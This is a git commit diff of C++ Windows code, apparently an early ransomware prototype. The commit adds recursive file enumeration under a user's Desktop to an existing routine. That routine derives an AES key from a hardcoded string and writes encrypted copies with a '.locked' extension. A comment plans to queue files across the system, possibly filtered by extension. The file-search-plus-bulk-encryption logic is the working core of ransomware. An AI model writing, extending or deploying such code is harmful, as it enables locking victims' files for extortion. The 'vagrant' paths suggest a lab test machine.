5e921765b0ea14cbd4ded55b307db498d75a1447
k0z4c <matteo.sondrio@gmail.com>
2022-03-29 10:47:02 +0200

    Add recursion file search

--- main.cpp
+++ main.cpp
@@ -2,12 +2,16 @@
 #include <functional>
 #include <sstream>
 #include <iomanip>
+#include <queue>
+#include <tchar.h>
+
 #include <Windows.h>
 #include <wincrypt.h>
 
 #pragma comment(lib, "advapi32.lib")
 
 using FileEnumerator = std::function<bool(const std::string&)>;
+using namespace std; 
 
 #define AES_KEY_SIZE 16
 #define IN_CHUNK_SIZE (AES_KEY_SIZE * 10) // a buffer must be a multiple of the key size
@@ -55,13 +59,31 @@ auto EnumerateFiles(const std::string& path, FileEnumerator Enumerator) -> int {
     HANDLE hFind = INVALID_HANDLE_VALUE;
     // Ensure that resource hFind is always disposed. 
     auto close_hFind = CloseHandleRAAI(std::bind(CloseHandleLog, hFind, "hFile"));
-    hFind = FindFirstFileW(utf8_decode(path).c_str(), &fdata);
+    //hFind = FindFirstFileW(utf8_decode(path).c_str(), &fdata);
+
+    //////////
+    FINDEX_INFO_LEVELS info_level = FindExInfoStandard;
+    FINDEX_SEARCH_OPS search_op = FindExSearchNameMatch;
+
+    hFind = FindFirstFileEx(
+        utf8_decode(path).c_str(),
+        info_level, &fdata, search_op,
+        nullptr, 0);
+
     if (hFind == INVALID_HANDLE_VALUE)
         return GetLastError();
-    do { //Consumer function 
+
+
+    DWORD fattr;
+    std::queue<wchar_t> q;
+    LPWSTR fullpath = nullptr;
+    do {
+        
         if (!Enumerator(utf8_encode(fdata.cFileName))) break;
+
     } while (FindNextFileW(hFind, &fdata) != 0);
     return ERROR_SUCCESS;
+
 }
 
 void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecrypt) {
@@ -70,7 +92,7 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     wchar_t* key_str = default_key;
 
     if (isDecrypt) {
-        printf("Decrypt mode\n");
+        std::cout << "Decrypt mode\n";
         isDecrypt = TRUE;
     }
     /*if (argc >= 5) {
@@ -79,31 +101,31 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     const size_t len = lstrlenW(key_str);
     const size_t key_size = len * sizeof(key_str[0]); // size in bytes
 
-    printf("Key: %S\n", key_str);
-    printf("Key len: %#x\n", len);
-    printf("Key size: %#x\n", key_size);
-    printf("Input File: %S\n", filename);
-    printf("Output File: %S\n", filename2);
-    printf("----\n");
+    std::cout << "Key: %S\n" <<  key_str << std::endl;
+    std::cout << "Key len: %#x\n" << len << std::endl;
+    std::cout << "Key size: %#x\n" << key_size << std::endl;
+    std::cout << "Input File: %S\n" << filename << std::endl;
+    std::cout << "Output File: %S\n" << filename2 << std::endl;
+    std::cout << "----\n";
 
     HANDLE hInpFile = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
     if (hInpFile == INVALID_HANDLE_VALUE) {
-        printf("Cannot open input file!\n");
+        std::cout << "Cannot open input file!\n";
         system("pause");
         return;
     }
     HANDLE hOutFile = CreateFileW(filename2, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hOutFile == INVALID_HANDLE_VALUE) {
-        printf("Cannot open output file!\n");
+        std::cout << "Cannot open output file!\n";
         system("pause");
         return;
     }
 
     if (isDecrypt) {
-        printf("DECRYPTING\n");
+        std::cout << "DECRYPTING\n";
     }
     else {
-        printf("ENCRYPTING\n");
+        std::cout << "ENCRYPTING\n";
     }
 
     DWORD dwStatus = 0;
@@ -112,7 +134,7 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     HCRYPTPROV hProv;
     if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         dwStatus = GetLastError();
-        printf("CryptAcquireContext failed: %x\n", dwStatus);
+        std::cout << "CryptAcquireContext failed: %x\n" << dwStatus;
         CryptReleaseContext(hProv, 0);
         system("pause");
         return;
@@ -120,7 +142,7 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
     HCRYPTHASH hHash;
     if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
         dwStatus = GetLastError();
-        printf("CryptCreateHash failed: %x\n", dwStatus);
+        std::cout << "CryptCreateHash failed: %x\n" << dwStatus;
         CryptReleaseContext(hProv, 0);
         system("pause");
         return;
@@ -128,21 +150,21 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
 
     if (!CryptHashData(hHash, (BYTE*)key_str, key_size, 0)) {
         DWORD err = GetLastError();
-        printf("CryptHashData Failed : %#x\n", err);
+        std::cout << "CryptHashData Failed : %#x\n" << err;
         system("pause");
         return;
     }
-    printf("[+] CryptHashData Success\n");
+    std::cout << "[+] CryptHashData Success\n";
 
     HCRYPTKEY hKey;
     if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
         dwStatus = GetLastError();
-        printf("CryptDeriveKey failed: %x\n", dwStatus);
+        std::cout << "CryptDeriveKey failed: %x\n" << dwStatus;
         CryptReleaseContext(hProv, 0);
         system("pause");
         return;
     }
-    printf("[+] CryptDeriveKey Success\n");
+    std::cout << "[+] CryptDeriveKey Success\n";
 
     const size_t chunk_size = isDecrypt ? IN_CHUNK_SIZE : OUT_CHUNK_SIZE;
     BYTE* chunk = new BYTE[chunk_size];
@@ -160,24 +182,24 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
         readTotalSize += out_len;
         if (readTotalSize >= inputSize) {
             isFinal = TRUE;
-            printf("Final chunk set, len: %d = %x\n", out_len, out_len);
+            std::cout << "Final chunk set, len: %d = %x" << out_len << " " << out_len << std::endl;
         }
 
         if (isDecrypt) {
             if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
-                printf("[-] CryptDecrypt failed: %x\n", GetLastError());
+                std::cout << "[-] CryptDecrypt failed: %x" << " " << GetLastError() << std::endl;
                 break;
             }
         }
         else {
             if (!CryptEncrypt(hKey, NULL, isFinal, 0, chunk, &out_len, chunk_size)) {
-                printf("[-] CryptEncrypt failed: %x\n", GetLastError());
+                std::cout << "[-] CryptEncrypt failed: %x" << " " << GetLastError() << std::endl;
                 break;
             }
         }
         DWORD written = 0;
         if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
-            printf("writing failed!\n");
+            std::cout << "writing failed!\n";
             break;
         }
         memset(chunk, 0, chunk_size);
@@ -191,9 +213,71 @@ void encryptFile(const wchar_t* filename, const wchar_t* filename2, bool isDecry
 
     CloseHandle(hInpFile);
     CloseHandle(hOutFile);
-    printf("Finished. Processed %#x bytes.\n", readTotalSize);
+    std::cout << "Finished. Processed %#x bytes.\n" << readTotalSize << std::endl;
 }
 
+/*void FindFile(const std::wstring& directory)
+{
+    std::wstring tmp = directory + L"\\*";
+    WIN32_FIND_DATAW file;
+    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
+    if (search_handle != INVALID_HANDLE_VALUE)
+    {
+        std::vector<std::wstring> directories;
+
+        do
+        {
+            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            {
+                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
+                    continue;
+            }
+
+            tmp = directory + L"\\" + std::wstring(file.cFileName);
+            std::wcout << tmp << std::endl;
+
+            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                directories.push_back(tmp);
+        } while (FindNextFileW(search_handle, &file));
+
+        FindClose(search_handle);
+
+        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
+            FindFile(*iter);
+    }
+}*/
+
+void FindFile(const std::wstring& directory, queue<wstring> &results)
+{
+    std::wstring tmp = directory + L"\\*";
+    WIN32_FIND_DATAW file;
+    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
+    if (search_handle != INVALID_HANDLE_VALUE)
+    {
+        std::vector<std::wstring> directories;
+
+        do
+        {
+            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            {
+                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
+                    continue;
+            }
+
+            tmp = directory + L"\\" + std::wstring(file.cFileName);
+            results.push(tmp);
+            std::wcout << tmp << std::endl;
+
+            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                directories.push_back(tmp);
+        } while (FindNextFileW(search_handle, &file));
+
+        FindClose(search_handle);
+
+        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
+            FindFile(*iter, results);
+    }
+}
 //params: <input file> <output file> <is decrypt mode> <key>
 int wmain(int argc, wchar_t* argv[])
 {
@@ -208,20 +292,29 @@ int wmain(int argc, wchar_t* argv[])
     const wchar_t* filename2 = L"c:\\users\\vagrant\\Desktop\\important.locked";
     encryptFile(filename2, filename, TRUE);
 
-    std::string directoryPath = "c:\\users\\vagrant\\*";
+    std::string directoryPath = "c:\\users\\vagrant\\Desktop\\*";
 
+    // we should create a queue of paths of files found on the system (maybe not all paths... just some, or some 
+    // files with particular extension
     int count = 0;
+    /*
     int status = EnumerateFiles(
         directoryPath,
         [&count](const auto& file) {
             std::cout << " => " << file << "\n";
-            std::cout << "executed" << std::endl; 
+            std::cout << "executed" << std::endl;
+
             if (count++ < 50)
                 return true;
             else
                 return false;
-        });
+        });*/
 
+    wstring directoryPath2 = L"c:\\users\\vagrant\\Desktop\\";
+    queue<wstring> results;
+    FindFile(directoryPath2, results);
 
+    cout << "queue ready" << endl;
+    cout << "number of el " << results.size() << endl;
     return 0;
 }
